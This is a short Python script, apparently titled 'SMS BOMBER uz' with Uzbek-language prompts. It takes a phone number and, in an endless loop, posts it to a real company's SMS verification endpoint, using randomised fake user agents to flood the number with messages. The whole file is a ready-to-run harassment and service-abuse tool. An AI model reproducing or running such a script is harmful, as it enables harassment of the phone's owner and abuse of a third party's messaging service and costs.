import requests, fake_useragent, time
import pyfiglet
from termcolor import colored

text=pyfiglet.print_figlet(text="SMS BOMBER uz", colors="BLUE")

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
NUMBER = input(colored('Telfon Raqamingizni Kiriting: (Misol Uchun +998) ' , 'red') )

while True:
    user = fake_useragent.UserAgent().random
    headers = {'user_agent' : user}

    try:
        response = requests.post('https://io.bellissimo.uz/api/verify-web', headers=headers, data={'phone' : NUMBER})
        print(colored('* Xabar Yuborilmoqda', 'blue'))
    except:
        print('Nmadur Xato Ketti Brat :(')

        time.sleep(5)
